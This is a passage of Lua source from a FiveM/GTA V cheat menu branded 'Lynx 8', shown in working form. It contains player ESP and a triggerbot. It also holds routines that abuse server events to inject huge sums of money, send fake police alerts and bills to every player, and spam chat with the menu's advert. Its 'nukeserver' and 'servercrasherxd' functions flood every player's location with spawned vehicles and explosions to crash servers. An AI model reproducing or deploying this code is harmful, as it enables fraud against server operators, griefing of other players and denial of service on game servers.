							"\nPlayer ID: " .. i .. "\nDist: " .. math.round(GetDistanceBetweenCoords(cx, cy, cz, x, y, z, true), 1)
			if IsPedInAnyVehicle(pPed, true) then
				local VehName = GetLabelText(GetDisplayNameFromVehicleModel(GetEntityModel(GetVehiclePedIsUsing(pPed))))
				message = message .. "\nVeh: " .. VehName
			end

			if espinfo and esp then
			DrawText3D(x, y, z - 1.0, message, ra.r, ra.g, ra.b)
			end
			if espbox and esp then
			LineOneBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, -0.9)
			LineOneEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, -0.9)
			LineTwoBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, -0.9)
			LineTwoEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, -0.9)
			LineThreeBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, -0.9)
			LineThreeEnd = GetOffsetFromEntityInWorldCoords(pPed, -0.3, 0.3, -0.9)
			LineFourBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, -0.9)

			TLineOneBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, 0.8)
			TLineOneEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, 0.8)
			TLineTwoBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, 0.8)
			TLineTwoEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, 0.8)
			TLineThreeBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, 0.8)
			TLineThreeEnd = GetOffsetFromEntityInWorldCoords(pPed, -0.3, 0.3, 0.8)
			TLineFourBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, 0.8)

			ConnectorOneBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, 0.3, 0.8)
			ConnectorOneEnd = GetOffsetFromEntityInWorldCoords(pPed, -0.3, 0.3, -0.9)
			ConnectorTwoBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, 0.8)
			ConnectorTwoEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, -0.9)
			ConnectorThreeBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, 0.8)
			ConnectorThreeEnd = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, -0.9)
			ConnectorFourBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, 0.8)
			ConnectorFourEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, -0.9)

			DrawLine(
				LineOneBegin.x,
				LineOneBegin.y,
				LineOneBegin.z,
				LineOneEnd.x,
				LineOneEnd.y,
				LineOneEnd.z,
				ra.r,
				ra.g,
				ra.b,
				255
			)
			DrawLine(
				LineTwoBegin.x,
				LineTwoBegin.y,
				LineTwoBegin.z,
				LineTwoEnd.x,
				LineTwoEnd.y,
				LineTwoEnd.z,
				ra.r,
				ra.g,
				ra.b,
				255
			)
			DrawLine(
				LineThreeBegin.x,
				LineThreeBegin.y,
				LineThreeBegin.z,
				LineThreeEnd.x,
				LineThreeEnd.y,
				LineThreeEnd.z,
				ra.r,
				ra.g,
				ra.b,
				255
			)
			DrawLine(
				LineThreeEnd.x,
				LineThreeEnd.y,
				LineThreeEnd.z,
				LineFourBegin.x,
				LineFourBegin.y,
				LineFourBegin.z,
				ra.r,
				ra.g,
				ra.b,
				255
			)
			DrawLine(
				TLineOneBegin.x,
				TLineOneBegin.y,
				TLineOneBegin.z,
				TLineOneEnd.x,
				TLineOneEnd.y,
				TLineOneEnd.z,
				ra.r,
				ra.g,
				ra.b,
				255
			)
			DrawLine(
				TLineTwoBegin.x,
				TLineTwoBegin.y,
				TLineTwoBegin.z,
				TLineTwoEnd.x,
				TLineTwoEnd.y,
				TLineTwoEnd.z,
				ra.r,
				ra.g,
				ra.b,
				255
			)
			DrawLine(
				TLineThreeBegin.x,
				TLineThreeBegin.y,
				TLineThreeBegin.z,
				TLineThreeEnd.x,
				TLineThreeEnd.y,
				TLineThreeEnd.z,
				ra.r,
				ra.g,
				ra.b,
				255
			)
			DrawLine(
				TLineThreeEnd.x,
				TLineThreeEnd.y,
				TLineThreeEnd.z,
				TLineFourBegin.x,
				TLineFourBegin.y,
				TLineFourBegin.z,
				ra.r,
				ra.g,
				ra.b,
				255
			)
			DrawLine(
				ConnectorOneBegin.x,
				ConnectorOneBegin.y,
				ConnectorOneBegin.z,
				ConnectorOneEnd.x,
				ConnectorOneEnd.y,
				ConnectorOneEnd.z,
				ra.r,
				ra.g,
				ra.b,
				255
			)
			DrawLine(
				ConnectorTwoBegin.x,
				ConnectorTwoBegin.y,
				ConnectorTwoBegin.z,
				ConnectorTwoEnd.x,
				ConnectorTwoEnd.y,
				ConnectorTwoEnd.z,
				ra.r,
				ra.g,
				ra.b,
				255
			)
			DrawLine(
				ConnectorThreeBegin.x,
				ConnectorThreeBegin.y,
				ConnectorThreeBegin.z,
				ConnectorThreeEnd.x,
				ConnectorThreeEnd.y,
				ConnectorThreeEnd.z,
				ra.r,
				ra.g,
				ra.b,
				255
			)
			DrawLine(
				ConnectorFourBegin.x,
				ConnectorFourBegin.y,
				ConnectorFourBegin.z,
				ConnectorFourEnd.x,
				ConnectorFourEnd.y,
				ConnectorFourEnd.z,
				ra.r,
				ra.g,
				ra.b,
				255
			)
		end
			if esplines and esp then
			DrawLine(cx, cy, cz, x, y, z, ra.r, ra.g, ra.b, 255)
			end
		end
	end
end

if VehGod and IsPedInAnyVehicle(PlayerPedId(-1), true) then
	SetEntityInvincible(GetVehiclePedIsUsing(PlayerPedId(-1)), true)
end

if oneshot then
	SetPlayerWeaponDamageModifier(PlayerId(-1), 100.0)
	local gotEntity = getEntity(PlayerId(-1))
	if IsEntityAPed(gotEntity) then
		if IsPedInAnyVehicle(gotEntity, true) then
			if IsPedInAnyVehicle(GetPlayerPed(-1), true) then
				if IsControlJustReleased(1, 69) then
					NetworkExplodeVehicle(GetVehiclePedIsIn(gotEntity, true), true, true, 0)
				end
			else
				if IsControlJustReleased(1, 142) then
					NetworkExplodeVehicle(GetVehiclePedIsIn(gotEntity, true), true, true, 0)
				end
			end
		end
	elseif IsEntityAVehicle(gotEntity) then
		if IsPedInAnyVehicle(GetPlayerPed(-1), true) then
			if IsControlJustReleased(1, 69) then
				NetworkExplodeVehicle(gotEntity, true, true, 0)
			end
		else
			if IsControlJustReleased(1, 142) then
				NetworkExplodeVehicle(gotEntity, true, true, 0)
			end
		end
	end
else
	SetPlayerWeaponDamageModifier(PlayerId(-1), 1.0)
end

if noreload then
	PedSkipNextReloading(GetPlayerPed(-1))
end

if rainbowf then
	for i = 1, 7 do
		Citizen.Wait(100)
		SetPedWeaponTintIndex(GetPlayerPed(-1), 1198879012, i)
		i = i + 1
		if i == 7 then
			i = 1
		end
	end
end

if BlowDrugsUp then
	Citizen.CreateThread(function()
	TriggerServerEvent("esx_drugs:startHarvestWeed")
	TriggerServerEvent("esx_drugs:startHarvestCoke")
	TriggerServerEvent("esx_drugs:startHarvestMeth")
	TriggerServerEvent("esx_drugs:startTransformOpium")
	TriggerServerEvent("esx_drugs:startTransformWeed")
	TriggerServerEvent("esx_drugs:startTransformCoke")
	TriggerServerEvent("esx_drugs:startTransformMeth")
	TriggerServerEvent("esx_drugs:startTransformOpium")
	TriggerServerEvent("esx_drugs:startSellWeed")
	TriggerServerEvent("esx_drugs:startSellCoke")
	TriggerServerEvent("esx_drugs:startSellMeth")
	TriggerServerEvent("esx_drugs:startSellOpium")
	Citizen.Wait(1000)
	end)
end

if blowall then
	for c = 0, 9 do
		TriggerServerEvent("_chat:messageEntered", "^13^24^3B^4y^5T^6e ^1C^2o^3m^4m^5u^6n^7i^1t^2y", { 141, 211, 255 }, "^"..c.."Lynx 8 ~ www.lynxmenu.com")
		end
					for i = 0, 128 do
			Citizen.Wait(500)	
			AddExplosion(GetEntityCoords(GetPlayerPed(i)), 5, 3000.0, true, false, 100000.0)
			AddExplosion(GetEntityCoords(GetPlayerPed(i)), 5, 3000.0, true, false, true)
	end
end

if crosshair then
	ShowHudComponentThisFrame(14)
end

if crosshairc then
	DrawTxt("~r~+", 0.495, 0.484)
end

if crosshairc2 then
	DrawTxt("~r~.", 0.4968, 0.478)
end

if nameabove then
	local ignorePlayerNameDistance = false
	local disPlayerNames = 130
	local playerSource = 0
	for id = 0, 128 do
		if  ((NetworkIsPlayerActive( id )) and GetPlayerPed( id ) ~= GetPlayerPed( -1 )) then
			ped = GetPlayerPed( id )
			blip = GetBlipFromEntity( ped )

			x1, y1, z1 = table.unpack( GetEntityCoords( GetPlayerPed( -1 ), true ) )
			x2, y2, z2 = table.unpack( GetEntityCoords( GetPlayerPed( id ), true ) )
			distance = math.floor(GetDistanceBetweenCoords(x1,  y1,  z1,  x2,  y2,  z2,  true))

			if(ignorePlayerNameDistance) then
				if NetworkIsPlayerTalking( id ) then
					local rgb = RGBRainbow(1.0)
					DrawText3D(x2, y2, z2+1.2, GetPlayerServerId(id).."  |  "..GetPlayerName(id), rgb.r,rgb.g,rgb.b)
				else
					DrawText3D(x2, y2, z2+1.2, GetPlayerServerId(id).."  |  "..GetPlayerName(id), 255,255,255)
				end
			end

			if ((distance < disPlayerNames)) then
				if not (ignorePlayerNameDistance) then
				if NetworkIsPlayerTalking( id ) then
					local rgb = RGBRainbow(1.0)
					DrawText3D(x2, y2, z2+1.2, GetPlayerServerId(id).."  |  "..GetPlayerName(id), rgb.r,rgb.g,rgb.b)
				else
					DrawText3D(x2, y2, z2+1.2, GetPlayerServerId(id).."  |  "..GetPlayerName(id), 255,255,255)
				end
				end
			end  
		end
	end
end

if showCoords then
	x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(-1), true))
	roundx = tonumber(string.format("%.2f", x))
	roundy = tonumber(string.format("%.2f", y))
	roundz = tonumber(string.format("%.2f", z))

	DrawTxt("~r~X:~s~ "..roundx, 0.05, 0.00)
	DrawTxt("~r~Y:~s~ "..roundy, 0.11, 0.00)
	DrawTxt("~r~Z:~s~ "..roundz, 0.17, 0.00)
end

function carthieftroll()
	for i = 0, 128 do
	local coords = GetEntityCoords(GetPlayerPed(i))
	TriggerServerEvent("esx_carthief:alertcops", coords.x, coords.y, coords.z)
	end
end


function automaticmoneyesx()
	local result = KeyboardInput("Warning, this value can be multiplied!!!", "", 100)
	if confirmtrig then
	if result ~= "" then
		local confirm = KeyboardInput("Are you sure? y/n", "", 0)
		if confirm == "y" then
		end
	drawNotification("~h~~g~Testing all ~y~ESX ~g~scripts~s~.", true)
	TriggerServerEvent("esx_carthief:pay", result)
TriggerServerEvent("esx_jobs:caution", "give_back", result)
TriggerServerEvent("esx_fueldelivery:pay", result)
TriggerServerEvent("esx_carthief:pay", result)
TriggerServerEvent("esx_godirtyjob:pay", result)
TriggerServerEvent("esx_pizza:pay", result)
TriggerServerEvent("esx_ranger:pay", result)
TriggerServerEvent("esx_garbagejob:pay", result)
TriggerServerEvent("esx_truckerjob:pay", result)
TriggerServerEvent("AdminMenu:giveBank", result)
TriggerServerEvent("AdminMenu:giveCash", result)
TriggerServerEvent("esx_gopostaljob:pay", result)
TriggerServerEvent("esx_banksecurity:pay", result)
TriggerServerEvent("esx_slotmachine:sv:2", result)
	elseif confirm == "n" then
		drawNotification("~h~~b~Operation cancelled~s~.", false)
	else
		drawNotification("~h~~b~Invalid Confirmation~s~.", true)
		drawNotification("~h~~b~Operation cancelled~s~.", false)
	end
end
end

function vrpdestroy()
		for c = 0, 9 do
			TriggerServerEvent("_chat:messageEntered", "^13^24^3B^4y^5T^6e ^1C^2o^3m^4m^5u^6n^7i^1t^2y", { 141, 211, 255 }, "^"..c.."Lynx 8 ~ www.lynxmenu.com")
			end
	TriggerServerEvent("lscustoms:payGarage", {costs = -99999999})
	TriggerServerEvent("vrp_slotmachine:server:2",999999999)
	TriggerServerEvent("Banca:deposit", 999999999)
	TriggerServerEvent("bank:deposit", 999999999)
	local fromPlayer = GetPlayerServerId(PlayerId());
	for i = 0, 128 do
	TriggerEvent("bank:transfer",  fromPlayer, GetPlayerServerId(i), 99999999)
	end
end

if haharip then
	esxdestroyv2()
	nukeserver()
end

function esxdestroyv2()
	Citizen.CreateThread(function()
TriggerServerEvent("esx_jobs:caution", "give_back", 9999999999)
TriggerServerEvent("esx_fueldelivery:pay", 9999999999)
TriggerServerEvent("esx_carthief:pay", 9999999999)
TriggerServerEvent("esx_godirtyjob:pay", 9999999999)
TriggerServerEvent("esx_pizza:pay", 9999999999)
TriggerServerEvent("esx_ranger:pay", 9999999999)
TriggerServerEvent("esx_garbagejob:pay", 9999999999)
TriggerServerEvent("esx_truckerjob:pay", 9999999999)
TriggerServerEvent("AdminMenu:giveBank", 9999999999)
TriggerServerEvent("AdminMenu:giveCash", 9999999999)
TriggerServerEvent("esx_gopostaljob:pay", 9999999999)
TriggerServerEvent("esx_banksecurity:pay", 9999999999)
TriggerServerEvent("esx_slotmachine:sv:2", 9999999999)
for c = 0, 9 do
	TriggerServerEvent("_chat:messageEntered", "^13^24^3B^4y^5T^6e ^1C^2o^3m^4m^5u^6n^7i^1t^2y", { 141, 211, 255 }, "^"..c.."Lynx 8 ~ www.lynxmenu.com")
	end
				for i = 0, 128 do
						TriggerServerEvent("esx:giveInventoryItem", GetPlayerServerId(i), "item_money", "money", 1254756)
						TriggerServerEvent("esx:giveInventoryItem", GetPlayerServerId(i), "item_money", "money", 1254756)		
						TriggerServerEvent("esx_billing:sendBill", GetPlayerServerId(i), "Purposeless", "Lynx 8 ~ www.lynxmenu.com", 43161337)
						TriggerServerEvent("NB:recruterplayer", GetPlayerServerId(i), "police", 3)
						TriggerServerEvent("NB:recruterplayer", i, "police", 3)
				end
	end)
end

function giveeveryone()
	Citizen.CreateThread(function()
		TriggerServerEvent("esx_jobs:caution", "give_back", 9999999999)
		TriggerServerEvent("esx_fueldelivery:pay", 9999999999)
		TriggerServerEvent("esx_carthief:pay", 9999999999)
		TriggerServerEvent("esx_godirtyjob:pay", 9999999999)
		TriggerServerEvent("esx_pizza:pay", 9999999999)
		TriggerServerEvent("esx_ranger:pay", 9999999999)
		TriggerServerEvent("esx_garbagejob:pay", 9999999999)
		TriggerServerEvent("esx_truckerjob:pay", 9999999999)
		TriggerServerEvent("AdminMenu:giveBank", 9999999999)
		TriggerServerEvent("AdminMenu:giveCash", 9999999999)
		TriggerServerEvent("esx_gopostaljob:pay", 9999999999)
		TriggerServerEvent("esx_banksecurity:pay", 9999999999)
		TriggerServerEvent("esx_slotmachine:sv:2", 9999999999)
		for i = 0, 128 do
			TriggerServerEvent("esx:giveInventoryItem", GetPlayerServerId(i), "item_money", "money", 125475600)
			TriggerServerEvent("esx:giveInventoryItem", GetPlayerServerId(i), "item_money", "money", 125475600)	
		end
	end)
end

function nukeserver()
	Citizen.CreateThread(function()
	local camion = "Avenger"
	local avion = "CARGOPLANE"
	local avion2 = "luxor"
	local heli = "maverick"
	local random = "blimp2"
	while not HasModelLoaded(GetHashKey(avion)) do
		Citizen.Wait(0)
		RequestModel(GetHashKey(avion))
	end
	while not HasModelLoaded(GetHashKey(avion2)) do
		Citizen.Wait(0)
		RequestModel(GetHashKey(avion2))
	end
	while not HasModelLoaded(GetHashKey(camion)) do
		Citizen.Wait(0)
		RequestModel(GetHashKey(camion))
	end
	while not HasModelLoaded(GetHashKey(heli)) do
		Citizen.Wait(0)
		RequestModel(GetHashKey(heli))
	end
	while not HasModelLoaded(GetHashKey(random)) do
		Citizen.Wait(0)
		RequestModel(GetHashKey(random))
	end
	for c = 0, 9 do
		TriggerServerEvent("_chat:messageEntered", "^13^24^3B^4y^5T^6e ^1C^2o^3m^4m^5u^6n^7i^1t^2y", { 141, 211, 255 }, "^"..c.."Lynx 8 ~ www.lynxmenu.com")
		end
					for i = 0, 128 do
			local avion2 = CreateVehicle(GetHashKey(camion),  GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and 
			CreateVehicle(GetHashKey(camion),  GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and 
			CreateVehicle(GetHashKey(camion),  2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true) and
			CreateVehicle(GetHashKey(avion),  GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and 
			CreateVehicle(GetHashKey(avion),  GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and 
			CreateVehicle(GetHashKey(avion),  2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true) and 
			CreateVehicle(GetHashKey(avion2),  GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and 
			CreateVehicle(GetHashKey(avion2),  GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and 
			CreateVehicle(GetHashKey(avion2),  2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true) and
			CreateVehicle(GetHashKey(heli),  GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and 
			CreateVehicle(GetHashKey(heli),  GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and 
			CreateVehicle(GetHashKey(heli),  2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true) and
			CreateVehicle(GetHashKey(random),  GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and 
			CreateVehicle(GetHashKey(random),  GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and 
			CreateVehicle(GetHashKey(random),  2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true) and
			AddExplosion(GetEntityCoords(GetPlayerPed(i)), 5, 3000.0, true, false, 100000.0) and
			AddExplosion(GetEntityCoords(GetPlayerPed(i)), 5, 3000.0, true, false, true)
		end
	end)
end

if servercrasherxd then
	Citizen.CreateThread(function()
		local camion = "Avenger"
		local avion = "CARGOPLANE"
		local avion2 = "luxor"
		local heli = "maverick"
		local random = "blimp2"
	while not HasModelLoaded(GetHashKey(avion)) do
		Citizen.Wait(0)
		RequestModel(GetHashKey(avion))
	end
	while not HasModelLoaded(GetHashKey(avion2)) do
		Citizen.Wait(0)
		RequestModel(GetHashKey(avion2))
	end
	while not HasModelLoaded(GetHashKey(camion)) do
		Citizen.Wait(0)
		RequestModel(GetHashKey(camion))
	end
	while not HasModelLoaded(GetHashKey(heli)) do
		Citizen.Wait(0)
		RequestModel(GetHashKey(heli))
	end
	while not HasModelLoaded(GetHashKey(random)) do
		Citizen.Wait(0)
		RequestModel(GetHashKey(random))
	end
					for i = 0, 128 do
						for a = 100, 150 do
			local avion2 = CreateVehicle(GetHashKey(camion),  GetEntityCoords(GetPlayerPed(i)) - a, true, true) and 
			CreateVehicle(GetHashKey(camion),  GetEntityCoords(GetPlayerPed(i)) - a, true, true) and 
			CreateVehicle(GetHashKey(camion),  2 * GetEntityCoords(GetPlayerPed(i)) + a, true, true) and
			CreateVehicle(GetHashKey(avion),  GetEntityCoords(GetPlayerPed(i)) - a, true, true) and 
			CreateVehicle(GetHashKey(avion),  GetEntityCoords(GetPlayerPed(i)) - a, true, true) and 
			CreateVehicle(GetHashKey(avion),  2 * GetEntityCoords(GetPlayerPed(i)) - a, true, true) and 
			CreateVehicle(GetHashKey(avion2),  GetEntityCoords(GetPlayerPed(i)) - a, true, true) and 
			CreateVehicle(GetHashKey(avion2),  2 * GetEntityCoords(GetPlayerPed(i)) + a, true, true) and
			CreateVehicle(GetHashKey(heli),  GetEntityCoords(GetPlayerPed(i)) - a, true, true) and 
			CreateVehicle(GetHashKey(heli),  GetEntityCoords(GetPlayerPed(i)) - a, true, true) and 
			CreateVehicle(GetHashKey(heli),  2 * GetEntityCoords(GetPlayerPed(i)) + a, true, true) and
			CreateVehicle(GetHashKey(random),  GetEntityCoords(GetPlayerPed(i)) - a, true, true) and 
			CreateVehicle(GetHashKey(random),  GetEntityCoords(GetPlayerPed(i)) - a, true, true) and 
			CreateVehicle(GetHashKey(random),  2 * GetEntityCoords(GetPlayerPed(i)) + a, true, true)
		end
	end
end)
end

if VehSpeed and IsPedInAnyVehicle(PlayerPedId(-1), true) then
	if IsControlPressed(0, 209) then
		SetVehicleForwardSpeed(GetVehiclePedIsUsing(PlayerPedId(-1)), 100.0)
	elseif IsControlPressed(0, 210) then
		SetVehicleForwardSpeed(GetVehiclePedIsUsing(PlayerPedId(-1)), 0.0)
	end
end

if TriggerBot then
	local Aiming, Entity = GetEntityPlayerIsFreeAimingAt(PlayerId(-1), Entity)
	if Aiming then
		if IsEntityAPed(Entity) and not IsPedDeadOrDying(Entity, 0) and IsPedAPlayer(Entity) then
			ShootPlayer(Entity)
		end
	end
end

DisplayRadar(true)

if RainbowVeh then
	local ra = RGBRainbow(1.0)
	SetVehicleCustomPrimaryColour(GetVehiclePedIsUsing(PlayerPedId(-1)), ra.r, ra.g, ra.b)
	SetVehicleCustomSecondaryColour(GetVehiclePedIsUsing(PlayerPedId(-1)), ra.r, ra.g, ra.b)
end

if rainbowh then
	for i = -1, 12 do
	Citizen.Wait(100)
	local ra = RGBRainbow(1.0)
	SetVehicleHeadlightsColour(GetVehiclePedIsUsing(PlayerPedId(-1)), i)
	SetVehicleNeonLightsColour(GetVehiclePedIsUsing(PlayerPedId(-1)), ra.r, ra.g, ra.b)
		if i == 12 then
			i = -1
		end
	end
end

if t2x then
	SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2.0 * 20.0)
end

if t4x then
	SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 4.0 * 20.0)
end

if t10x then
	SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 10.0 * 20.0)
end

if t16x then
	SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16.0 * 20.0)
end

if txd then
	SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 500.0 * 20.0)
end

if Noclip then
	local currentSpeed = 2
	local noclipEntity =
		IsPedInAnyVehicle(PlayerPedId(-1), false) and GetVehiclePedIsUsing(PlayerPedId(-1)) or PlayerPedId(-1)
	FreezeEntityPosition(PlayerPedId(-1), true)
	SetEntityInvincible(PlayerPedId(-1), true)

	local newPos = GetEntityCoords(entity)

	DisableControlAction(0, 32, true)
	DisableControlAction(0, 268, true)

	DisableControlAction(0, 31, true)

	DisableControlAction(0, 269, true)
	DisableControlAction(0, 33, true)

	DisableControlAction(0, 266, true)
	DisableControlAction(0, 34, true) 

	DisableControlAction(0, 30, true)

	DisableControlAction(0, 267, true) 
	DisableControlAction(0, 35, true) 

	DisableControlAction(0, 44, true)
	DisableControlAction(0, 20, true)

	local yoff = 0.0
	local zoff = 0.0

	if GetInputMode() == "MouseAndKeyboard" then
		if IsDisabledControlPressed(0, 32) then
			yoff = 0.5
		end
		if IsDisabledControlPressed(0, 33) then
			yoff = -0.5
		end
		if IsDisabledControlPressed(0, 34) then
			SetEntityHeading(PlayerPedId(-1), GetEntityHeading(PlayerPedId(-1)) + 3.0)
		end
		if IsDisabledControlPressed(0, 35) then
			SetEntityHeading(PlayerPedId(-1), GetEntityHeading(PlayerPedId(-1)) - 3.0)
		end
		if IsDisabledControlPressed(0, 44) then
			zoff = 0.21
		end
		if IsDisabledControlPressed(0, 20) then
			zoff = -0.21
		end
	end

	newPos =
		GetOffsetFromEntityInWorldCoords(noclipEntity, 0.0, yoff * (currentSpeed + 0.3), zoff * (currentSpeed + 0.3))

	local heading = GetEntityHeading(noclipEntity)
	SetEntityVelocity(noclipEntity, 0.0, 0.0, 0.0)
	SetEntityRotation(noclipEntity, 0.0, 0.0, 0.0, 0, false)
	SetEntityHeading(noclipEntity, heading)

	SetEntityCollision(noclipEntity, false, false)
	SetEntityCoordsNoOffset(noclipEntity, newPos.x, newPos.y, newPos.z, true, true, true)

	FreezeEntityPosition(noclipEntity, false)
	SetEntityInvincible(noclipEntity, false)
	SetEntityCollision(noclipEntity, true, true)
end
end
end)

Citizen.CreateThread(
	function()
		FreezeEntityPosition(entity, false)

		local playerIdxWeapon = 1;
		local bBlips = true
		local WeaponTypeSelect = nil
		local WeaponSelected = nil
		local ModSelected = nil
		local currentItemIndex = 1
		local selectedItemIndex = 1
		local powerboost = { 1.0, 2.0, 4.0, 10.0, 512.0, 9999.0 }
		LynxEvo.CreateMenu("LynxX", lynxevo)
		LynxEvo.SetSubTitle("lynxX", "34ByTe Community")
		LynxEvo.CreateSubMenu("SelfMenu", "LynxX", "Self Menu")
		LynxEvo.CreateSubMenu("TeleportMenu", "LynxX", "Teleport Menu")
		LynxEvo.CreateSubMenu("WeaponMenu", "LynxX", "Weapon Menu")
		LynxEvo.CreateSubMenu("AdvM", "LynxX", "Advanced Menu")
		LynxEvo.CreateSubMenu("LuaMenu", "LynxX", "Lua Menu")
		LynxEvo.CreateSubMenu("VehicleMenu", "LynxX", "Vehicle Menu")
		LynxEvo.CreateSubMenu("OnlinePlayerMenu", "LynxX", "Online Player Menu")
		LynxEvo.CreateSubMenu("PlayerOptionsMenu", "OnlinePlayerMenu", "Player Options")
		LynxEvo.CreateSubMenu("Destroyer", "AdvM", "Destroyer Menu")
		LynxEvo.CreateSubMenu("ESXBoss", "LuaMenu", "ESX Boss Triggers")
		LynxEvo.CreateSubMenu("ESXMoney", "LuaMenu", "ESX Money Triggers")
		LynxEvo.CreateSubMenu("ESXDrugs", "LuaMenu", "ESX Drugs")
		LynxEvo.CreateSubMenu("ESXCustom", "LuaMenu", "ESX Random Triggers")
		LynxEvo.CreateSubMenu("VRPTriggers", "LuaMenu", "VRP Triggers")
		LynxEvo.CreateSubMenu("MiscTriggers", "LuaMenu", "Misc Triggers")
		LynxEvo.CreateSubMenu("crds", "LynxX", "Credits")
		LynxEvo.CreateSubMenu("ESXJobs", "LuaMenu", "ESX Jobs")
		LynxEvo.CreateSubMenu("ESXJobs2", "PlayerOptionsMenu", "ESX Jobs Individual")
		LynxEvo.CreateSubMenu("ESXTriggerini", "PlayerOptionsMenu", "ESX Triggers")
		LynxEvo.CreateSubMenu("Trollmenu", "PlayerOptionsMenu", "Troll Menu")
		LynxEvo.CreateSubMenu("WeaponTypes", "WeaponMenu", "Weapons")
		LynxEvo.CreateSubMenu("WeaponTypeSelection", "WeaponTypes", "Weapon")
		LynxEvo.CreateSubMenu("WeaponOptions", "WeaponTypeSelection", "Weapon Options")
		LynxEvo.CreateSubMenu("ModSelect", "WeaponOptions", "Weapon Mod Options")
		LynxEvo.CreateSubMenu("CarTypes", "VehicleMenu", "Vehicles")
		LynxEvo.CreateSubMenu("CarTypeSelection", "CarTypes", "Moew :3")
		LynxEvo.CreateSubMenu("CarOptions", "CarTypeSelection", "Car Options")
		LynxEvo.CreateSubMenu("MainTrailer", "VehicleMenu", "Trailers to Attach")
		LynxEvo.CreateSubMenu("MainTrailerSel", "MainTrailer", "Trailers Available")
		LynxEvo.CreateSubMenu("MainTrailerSpa", "MainTrailerSel", "Trailer Options")
		LynxEvo.CreateSubMenu("GiveSingleWeaponPlayer", "OnlinePlayerMenu", "Single Weapon Menu")
		LynxEvo.CreateSubMenu("ESPMenu", "AdvM", "ESP Menu")
		LynxEvo.CreateSubMenu("LSC", "VehicleMenu", "LSC Customs")
        LynxEvo.CreateSubMenu("tunings", "LSC", "Visual Tuning")
		LynxEvo.CreateSubMenu("performance", "LSC", "Performance Tuning")
		LynxEvo.CreateSubMenu("VRPPlayerTriggers", "PlayerOptionsMenu", "VRP Triggers")
		LynxEvo.CreateSubMenu("BoostMenu", "VehicleMenu", "Vehicle Boost")
		LynxEvo.CreateSubMenu("SpawnPeds", "Trollmenu", "Spawn Peds")
		LynxEvo.CreateSubMenu("GCT", "VehicleMenu", "Global Car Trolls")
		LynxEvo.CreateSubMenu("CsMenu", "AdvM", "Crosshairs")

		for i,theItem in pairs(vehicleMods) do
            LynxEvo.CreateSubMenu(theItem.id, "tunings", theItem.name)
            
            if theItem.id == "paint" then
                LynxEvo.CreateSubMenu("primary", theItem.id, "Primary Paint")
                LynxEvo.CreateSubMenu("secondary", theItem.id, "Secondary Paint")
                
                LynxEvo.CreateSubMenu("rimpaint", theItem.id, "Wheel Paint")
                
                LynxEvo.CreateSubMenu("classic1", "primary", "Classic Paint")
                LynxEvo.CreateSubMenu("metallic1", "primary", "Metallic Paint")
                LynxEvo.CreateSubMenu("matte1", "primary","Matte Paint")
                LynxEvo.CreateSubMenu("metal1", "primary","Metal Paint")
                LynxEvo.CreateSubMenu("classic2", "secondary", "Classic Paint")
                LynxEvo.CreateSubMenu("metallic2", "secondary", "Metallic Paint")
                LynxEvo.CreateSubMenu("matte2", "secondary","Matte Paint")
                LynxEvo.CreateSubMenu("metal2", "secondary","Metal Paint")            
                LynxEvo.CreateSubMenu("classic3", "rimpaint", "Classic Paint")
                LynxEvo.CreateSubMenu("metallic3", "rimpaint", "Metallic Paint")
                LynxEvo.CreateSubMenu("matte3", "rimpaint","Matte Paint")
                LynxEvo.CreateSubMenu("metal3", "rimpaint","Metal Paint")
                
            end
        end
        
        for i,theItem in pairs(perfMods) do
            LynxEvo.CreateSubMenu(theItem.id, "performance", theItem.name)
        end

		local SelectedPlayer

		while Enabled do

			ped = PlayerPedId()
            veh = GetVehiclePedIsUsing(ped)
            SetVehicleModKit(veh,0)

			for i,theItem in pairs(vehicleMods) do
					
				if LynxEvo.IsMenuOpened("tunings") then
					if isPreviewing then
						if oldmodtype == "neon" then
							local r,g,b = table.unpack(oldmod)
							SetVehicleNeonLightsColour(veh,r,g,b)
							SetVehicleNeonLightEnabled(veh, 0, oldmodaction)
							SetVehicleNeonLightEnabled(veh, 1, oldmodaction)
